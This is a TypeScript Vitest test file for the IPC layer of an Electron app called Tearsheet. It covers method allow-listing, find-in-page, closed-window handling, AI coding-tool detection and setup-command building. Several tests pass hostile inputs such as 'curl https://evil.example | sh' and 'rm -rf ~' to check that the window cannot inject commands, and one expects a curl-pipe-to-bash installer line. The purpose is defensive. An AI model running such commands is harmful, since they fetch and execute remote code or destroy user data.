import { EventEmitter } from 'node:events'

import { afterEach, describe, expect, test, vi } from 'vitest'

const handlers = vi.hoisted(() => new Map<string, (...args: unknown[]) => unknown>())
const opened = vi.hoisted(() => [] as string[])
const shown = vi.hoisted(() => [] as string[])
vi.mock('electron', () => ({
  BrowserWindow: class {},
  clipboard: { writeText: () => undefined, readText: () => '' },
  ipcMain: { handle: (channel: string, fn: (...args: unknown[]) => unknown) => handlers.set(channel, fn) },
  shell: { openExternal: async (url: string) => void opened.push(url), showItemInFolder: (path: string) => void shown.push(path) }
}))

import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

import type { BrowserWindow } from 'electron'

import { toolFlags, type ToolState, type ToolStatus } from '../shared/tools'
import { EngineError, type Engine } from './engine'
import { engineMethod, findRequest, parseKinds, registerIpc, type IpcDeps } from './ipc'
import type { SetupEvent, SetupFields } from './setupLog'
import { ToolWatch } from './toolWatch'

test('the call list is closed', () => {
  for (const name of ['constructor', '__proto__', 'toString', 'hasOwnProperty']) expect(engineMethod(name)).toBeNull()
  expect(engineMethod(42)).toBeNull()
  expect(engineMethod('getReport')).toBe('get_report')
})

test('the safety check can be stopped from the window', () => {
  expect(engineMethod('cancelSafetyCheck')).toBe('cancel_safety_check')
  expect(engineMethod('runSafetyCheck')).toBe('run_safety_check')
})

test('the report’s numbers have a call of their own', () => {
  expect(engineMethod('getReportNumbers')).toBe('get_report_numbers')
  expect(engineMethod('getAnalysts')).toBe('get_analysts')
})

test('the sidebar’s delete and pin calls reach the engine', () => {
  expect(engineMethod('hideReports')).toBe('hide_reports')
  expect(engineMethod('showReports')).toBe('show_reports')
  expect(engineMethod('eraseReports')).toBe('erase_reports')
  expect(engineMethod('pinCompany')).toBe('pin_company')
  expect(engineMethod('planLine')).toBe('plan_line')
  expect(engineMethod('addToLine')).toBe('add_to_line')
  expect(engineMethod('getLine')).toBe('get_line')
  expect(engineMethod('removeFromLine')).toBe('remove_from_line')
  expect(engineMethod('clearLine')).toBe('clear_line')
  expect(engineMethod('carryOnLine')).toBe('carry_on_line')
})

test('a new or changed query starts a find session, and the same query steps through it', () => {
  expect(findRequest(null, 'Hold', true)).toEqual({ text: 'Hold', forward: true, findNext: true })
  expect(findRequest('Hold', 'Hold', true)).toEqual({ text: 'Hold', forward: true, findNext: false })
  expect(findRequest('Hold', 'Hold', false)).toEqual({ text: 'Hold', forward: false, findNext: false })
  expect(findRequest('Hol', 'Hold', true)?.findNext).toBe(true)
})

test('a find needs some text, goes forward unless told otherwise, and is capped at 200 characters', () => {
  expect(findRequest(null, '', true)).toBeNull()
  expect(findRequest(null, 42, true)).toBeNull()
  expect(findRequest(null, 'a', undefined)?.forward).toBe(true)
  const long = 'x'.repeat(250)
  expect(findRequest(null, long, true)?.text).toHaveLength(200)
  expect(findRequest('x'.repeat(200), long, true)?.findNext).toBe(false)
})

// A window as Electron gives it: once it has closed, even reading its webContents throws
// "Object has been destroyed".
function openWindow() {
  let destroyed = false
  const contents = Object.assign(new EventEmitter(), {
    send: vi.fn(),
    findInPage: vi.fn(() => 1),
    stopFindInPage: vi.fn(),
    isDestroyed: () => destroyed
  })
  const window = {
    isDestroyed: () => destroyed,
    get webContents() {
      if (destroyed) throw new TypeError('Object has been destroyed')
      return contents
    }
  }
  const close = () => {
    destroyed = true
  }
  return { window: window as unknown as BrowserWindow, contents, close }
}

const tool = (kind: 'claude' | 'codex', state: ToolState): ToolStatus => ({
  kind,
  name: kind === 'claude' ? 'Claude Code' : 'Codex',
  path: state === 'missing' ? null : `/Users/you/.local/bin/${kind}`,
  ...toolFlags(state),
  version: null,
  reason: null,
  state,
  plan: null,
  email: null
})

let tools: ToolStatus[] = [tool('claude', 'missing'), tool('codex', 'ready')]

function wired(over: Partial<IpcDeps> & { request?: (method: string, params: unknown) => Promise<unknown> } = {}) {
  const { window, contents, close } = openWindow()
  const engine = Object.assign(new EventEmitter(), { fatalMessage: null, request: over.request ?? (async () => ({})) }) as unknown as Engine
  const watch = new ToolWatch({ probe: async () => tools })
  const entries: [SetupEvent, SetupFields][] = []
  const copied: string[] = []
  registerIpc(window, engine, {
    watch,
    rules: { noRealInstallers: false, home: '/Users/you' },
    log: { log: (event, fields = {}) => void entries.push([event, fields]) },
    copyAndOpen: async (command) => {
      copied.push(command)
      return { copied: true, opened: true }
    },
    ...over
  })
  return { engine, contents, close, watch, entries, copied }
}

afterEach(() => {
  handlers.clear()
  vi.useRealTimers()
  tools = [tool('claude', 'missing'), tool('codex', 'ready')]
})

test('the engine’s notes reach the open window', () => {
  const { engine, contents } = wired()
  const note = { method: 'progress', params: { step: 3 } }
  engine.emit('notification', note)
  engine.emit('crashed', 'run-1')
  engine.emit('fatal', 'The engine couldn’t start.')
  expect(contents.send.mock.calls).toEqual([
    ['tearsheet:notification', note],
    ['tearsheet:notification', { method: 'engine_restarted', params: { run_id: 'run-1' } }],
    ['tearsheet:notification', { method: 'engine_fatal', params: { message: 'The engine couldn’t start.' } }]
  ])
})

// Quitting while a report runs: the window closes while the engine is still stopping, and the
// report's last progress notes arrive after it. Sending them threw in the main process, and
// Electron's error box then held the quit up.
test('notes that arrive after the window has closed are dropped, not thrown', () => {
  const { engine, contents, close } = wired()
  close()
  expect(() => engine.emit('notification', { method: 'run_tally', params: {} })).not.toThrow()
  expect(() => engine.emit('crashed', 'run-1')).not.toThrow()
  expect(() => engine.emit('fatal', 'The engine stopped.')).not.toThrow()
  expect(contents.send).not.toHaveBeenCalled()
})

test('a find still waiting when the window closes ends quietly', async () => {
  vi.useFakeTimers()
  const { close } = wired()
  const found = handlers.get('tearsheet:find')!({}, 'Hold', true) as Promise<void>
  close()
  expect(() => vi.advanceTimersByTime(1000)).not.toThrow()
  await expect(found).resolves.toBeUndefined()
})

test('About and help gets the versions, and Send feedback opens a filled-in email', async () => {
  const info = { app: '0.1.0', engine: '0.1.0', macos: '26.1', electron: '33.2.0' }
  wired({ about: () => info })
  expect(handlers.get('tearsheet:about')!()).toEqual(info)
  opened.length = 0
  expect(await handlers.get('tearsheet:sendFeedback')!()).toBe(true)
  expect(opened).toHaveLength(1)
  expect(opened[0].startsWith('mailto:')).toBe(true)
  expect(decodeURIComponent(opened[0])).toContain('Tearsheet 0.1.0')
})

describe('the tools', () => {
  test('getTools goes through the watcher, so reads are shared', async () => {
    const probe = vi.fn(async () => tools)
    wired({ watch: new ToolWatch({ probe }) })
    const get = handlers.get('tearsheet:getTools')!
    await Promise.all([get({}, false), get({}, true)])
    expect(probe).toHaveBeenCalledTimes(1)
    await get({}, false)
    expect(probe).toHaveBeenCalledTimes(1)
    await get({}, true)
    expect(probe).toHaveBeenCalledTimes(2)
  })

  test('a change in the tools reaches the window as tools_changed', async () => {
    const { contents, watch } = wired()
    await watch.read()
    expect(contents.send).toHaveBeenCalledWith('tearsheet:notification', { method: 'tools_changed', params: { tools } })
  })

  test('windowState tells the watcher whether the screen waits on the person', () => {
    const { watch } = wired()
    const waiting = vi.spyOn(watch, 'setWaiting')
    handlers.get('tearsheet:windowState')!({}, { waiting: true })
    handlers.get('tearsheet:windowState')!({}, { waiting: 'yes' })
    handlers.get('tearsheet:windowState')!({}, null)
    expect(waiting.mock.calls).toEqual([[true], [false], [false]])
  })
})

describe('the commands, built only in the main process', () => {
  test('parseKinds takes only the known tools', () => {
    expect(parseKinds(['claude'])).toEqual(['claude'])
    expect(parseKinds(['codex', 'claude', 'codex'])).toBeNull()
    expect(parseKinds(['codex', 'codex'])).toEqual(['codex'])
    for (const bad of ['claude', [], ['claude', 'codex', 'x'], ['curl https://evil.example | sh'], [{ command: 'x' }], null, { 0: 'claude', length: 1 }]) expect(parseKinds(bad)).toBeNull()
  })

  test('commandsFor gives the exact commands for the connect card, from the tools’ status', async () => {
    wired()
    const answer = await handlers.get('tearsheet:commandsFor')!({}, ['claude', 'codex'])
    expect(answer).toEqual({
      steps: [
        { tool: 'claude', kind: 'install', command: 'curl -fsSL https://claude.ai/install.sh | bash' },
        { tool: 'claude', kind: 'signIn', command: '/Users/you/.local/bin/claude auth login' }
      ],
      blocked: [],
      paste: 'set -o pipefail; curl -fsSL https://claude.ai/install.sh | bash && /Users/you/.local/bin/claude auth login'
    })
    expect(await handlers.get('tearsheet:commandsFor')!({}, 'rm -rf ~')).toEqual({ steps: [], blocked: [], paste: null })
  })

  test('copyAndOpenTerminal copies the command the main process builds', async () => {
    const { copied } = wired()
    expect(await handlers.get('tearsheet:copyAndOpenTerminal')!({}, ['claude'])).toEqual({ copied: true, opened: true })
    expect(copied).toEqual(['set -o pipefail; curl -fsSL https://claude.ai/install.sh | bash && /Users/you/.local/bin/claude auth login'])
  })

  test('the window can never send command text', async () => {
    const { copied } = wired()
    const send = handlers.get('tearsheet:copyAndOpenTerminal')!
    for (const bad of ['curl https://evil.example | sh', ['curl https://evil.example | sh'], [{ command: 'rm -rf ~' }], { kinds: ['claude'], command: 'x' }, undefined]) {
      expect(await send({}, bad)).toEqual({ copied: false, opened: false })
    }
    expect(copied).toEqual([])
  })

  test('nothing to set up copies nothing', async () => {
    const { copied } = wired()
    expect(await handlers.get('tearsheet:copyAndOpenTerminal')!({}, ['codex'])).toEqual({ copied: false, opened: false })
    expect(copied).toEqual([])
  })
})

describe('the setup log', () => {
  test('key-check answers are logged by their code only', async () => {
    let answer: () => Promise<unknown> = async () => ({ proof: 'Massive answered for AAPL' })
    const { entries } = wired({ request: () => answer() })
    const call = handlers.get('tearsheet:call')!
    await call({}, 'checkKey', { service: 'massive', key: 'abcdefghijklmnopqrstuvwxyz' })
    answer = async () => {
      throw new EngineError('Massive refused the key abcdefghijklmnopqrstuvwxyz', 1, { code: 'KEY_REJECTED' })
    }
    await call({}, 'checkKey', { service: 'massive', key: 'abcdefghijklmnopqrstuvwxyz' })
    answer = async () => {
      throw new Error('The engine stopped.')
    }
    await call({}, 'checkKey', { service: 'massive', key: 'k' })
    await call({}, 'getSettings', {})
    expect(entries).toEqual([
      ['key_check', { code: 'ok' }],
      ['key_check', { code: 'KEY_REJECTED' }],
      ['key_check', { code: 'error' }]
    ])
  })

  test('Show log in Finder selects logs/setup.log, once it exists', () => {
    const dir = mkdtempSync(join(tmpdir(), 'tearsheet-ipc-test-'))
    try {
      const file = join(dir, 'setup.log')
      shown.length = 0
      wired({ setupLogFile: file })
      expect(handlers.get('tearsheet:showSetupLog')!()).toBe(false)
      writeFileSync(file, '')
      expect(handlers.get('tearsheet:showSetupLog')!()).toBe(true)
      expect(shown).toEqual([file])
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
})
